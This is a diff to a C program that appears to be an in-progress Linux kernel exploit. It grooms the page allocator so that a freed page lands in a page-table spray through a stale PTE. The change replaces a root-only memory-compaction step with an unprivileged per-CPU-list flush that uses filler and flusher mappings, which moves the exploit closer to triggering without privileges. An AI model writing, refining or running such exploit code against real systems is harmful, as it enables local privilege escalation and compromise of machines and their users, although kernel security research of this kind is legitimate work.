@@ -35,7 +35,10 @@
 #define MAGIC_F  0xf00df00du     /* spray file marker; its pfns show up in PTEs */
 #define DBG      "/sys/kernel/debug/dropwrite/"
 
-#define PREFILL_MB   128         /* shrink movable free pool, leave room for PTs */
+#define PREFILL_MB   256         /* big filler: STAYS mapped -> keeps movable free
+				    pool drained so X is ~the only movable free page */
+#define FLUSH_MB     8           /* small filler: munmap'd to overflow the movable
+				    pcp `high` watermark and flush X pcp->buddy */
 #define SPRAY_MAPS   60000       /* pte-page mappings to attempt (OOM-breaks earlier) */
 #define SPRAY_TOUCH  64          /* pages faulted per mapping (1 pte-page, 64 set-PTEs) */
 #define SCAN_EVERY   256         /* scan cadence */
@@ -98,14 +101,22 @@ int main(void)
 	if (mmap(NULL, SZ, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
 		 f, 0) == MAP_FAILED) { perror("cache F"); return 2; }
 
-	/* pre-fill movable memory so X is one of few order-0 movable free pages */
+	/* big filler: exhaust movable free (stays mapped). small filler: freed
+	 * later just to overflow the pcp and flush X to buddy. */
 	size_t fill = (size_t)PREFILL_MB * ONE_MB;
 	char *filler = mmap(NULL, fill, PROT_READ | PROT_WRITE,
 			    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
 	if (filler == MAP_FAILED) { perror("prefill"); return 2; }
 	madvise(filler, fill, MADV_NOHUGEPAGE);
 	for (size_t o = 0; o < fill; o += 0x1000) filler[o] = 1;
-	printf("[*] prefilled %d MB movable\n", PREFILL_MB);
+
+	size_t flush = (size_t)FLUSH_MB * ONE_MB;
+	char *flusher = mmap(NULL, flush, PROT_READ | PROT_WRITE,
+			     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (flusher == MAP_FAILED) { perror("flusher"); return 2; }
+	madvise(flusher, flush, MADV_NOHUGEPAGE);
+	for (size_t o = 0; o < flush; o += 0x1000) flusher[o] = 1;
+	printf("[*] filled %d MB movable (+%d MB flusher)\n", PREFILL_MB, FLUSH_MB);
 
 	/* victim + deterministic stale PTE */
 	int a = mk("A", MAGIC_A), b = mk("B", MAGIC_B);
@@ -137,12 +148,14 @@ int main(void)
 	print_oracle("post-free");
 
 	/* X is parked on the movable pcp list; fallback steals from the buddy
-	 * free area, so flush pcp->buddy. compact_memory drains all pcp lists
-	 * and coalesces -- X lands in a movable buddy block (a big coalesced
-	 * block is also a prime wholesale steal target). [root-only; a real
-	 * unprivileged trigger comes later.] */
-	wr("/proc/sys/vm/compact_memory", "1");
-	print_oracle("post-compact");
+	 * free area. Flush pcp->buddy the UNPRIVILEGED way: free a pile of
+	 * movable pages (munmap the filler) to overflow the movable pcp `high`
+	 * watermark -> free_pcppages_bulk drains the list (incl. X) into the
+	 * buddy free area, where an unmovable fallback steal can reach it. The
+	 * big filler stays mapped, so X is ~the only movable free page and thus
+	 * the fallback steal target. */
+	munmap(flusher, flush);
+	print_oracle("post-drain");
 
 	/* drain unmovable freelist -> force fallback steal of X's movable block */
 	for (int k = 0; k < SPRAY_MAPS; k++) {
